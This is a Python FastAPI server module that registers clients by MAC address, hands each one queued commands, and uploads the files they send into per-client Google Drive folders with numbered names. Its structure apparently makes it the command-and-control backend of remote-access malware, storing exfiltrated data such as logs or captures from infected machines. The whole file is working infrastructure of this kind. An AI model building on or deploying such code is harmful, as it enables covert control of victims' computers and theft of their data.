from typing import List, Dict

from fastapi import Request

from driveapi import upload_file_from_existing_file, create_folder
from consts import HTTPHeaders, DBIdentifiers
from db_utils import DBHandler

NO_COMMANDS = ['no_commands']
TEMP_FILE = 'temp'
db_handler = DBHandler()


def handle_first_command(request: Request) -> Dict[str, List[str]]:
    """
    If the client is new, initializes it in DB and creates Google Drive
     folder. Otherwise retrieves the command for the client from the DB.
    Args:
        request (Request): The request received from the client.

    Returns:
        Dict[str, List[str]]: the commands addressed to that client.
    """
    mac = request.headers[HTTPHeaders.MAC]
    datetime = request.headers[HTTPHeaders.DATETIME]
    if db_handler.db.get(mac) is None:
        # new client
        _create_new_client(mac, datetime)
        return {'commands': NO_COMMANDS}
    else:
        # existing client
        update_datetime(request)
        return _get_commands(mac)


def handle_command_request(request: Request) -> Dict[str, List[str]]:
    """
    Retrieves the commands for the client from the DB.
    Args:
        request (Request): The request received from the client.

    Returns:
         Dict[str, List[str]]: the commands addressed to the client.
    """
    mac = request.headers[HTTPHeaders.MAC]
    return _get_commands(mac)


async def upload_file(request: Request, filename: str, db_identifier: DBIdentifiers,
                      file_type: str, remove_nulls: bool = False) -> None:
    """
    Uploads the file content of the request to the (already created)
      Google Drive folder.
    Args:
        request (Request): The request received from the client.
        filename (str): The name of the file that will be uploaded.
        db_identifier (DBIdentifiers): The identifier in the DB which
          counts how many files of that name have been uploaded, so that
          the new file will be numbered.
        file_type (str): The file ending. NOT the MIME type.
        remove_nulls (bool): If set to True, removes all the null
         characters in the file. Defaults to False.
    """
    if db_identifier not in DBIdentifiers.__members__.values():
        return  # illegal identifier
    mac = request.headers[HTTPHeaders.MAC]
    await _write_to_temp_file(request, remove_nulls)
    title = _build_title(mac, filename, file_type, db_identifier)
    _increase_identifier(mac, db_identifier)
    upload_file_from_existing_file(title=title,
                                   src_filename=TEMP_FILE,
                                   mime_type=request.headers[HTTPHeaders.CONTENT_TYPE],
                                   parent_folder_title=mac)


def update_datetime(request: Request) -> None:
    """
    Updates the DB datetime for some client.
    Args:
        request: The request received from the client.
    """
    mac_address = request.headers[HTTPHeaders.MAC]
    datetime = request.headers[HTTPHeaders.DATETIME]
    db_handler.db[mac_address].last_datetime = datetime
    db_handler.update_db()


def _get_commands(mac_address: str) -> Dict[str, List[str]]:
    commands = db_handler.retrieve_commands_from_db(mac_address) or NO_COMMANDS
    return {'commands': commands}


def _create_new_client(mac: str, datetime: str) -> None:
    db_handler.initialize_new_client(mac, datetime)
    create_folder(mac)  # Create new Google Drive folder for the new client


async def _write_to_temp_file(request: Request, remove_nulls: bool) -> None:
    data = await request.body()
    if remove_nulls:
        data = data.replace(b'\x00', b'')
    with open(TEMP_FILE, 'wb') as f:
        f.write(data)


def _build_title(mac: str, filename: str, file_type: str, db_identifier: DBIdentifiers) -> str:
    return f'{filename}{getattr(db_handler.db[mac], db_identifier)}.{file_type}'


def _increase_identifier(mac: str, db_identifier: DBIdentifiers) -> None:
    setattr(db_handler.db[mac], db_identifier,
            getattr(db_handler.db[mac], db_identifier) + 1)
    db_handler.update_db()


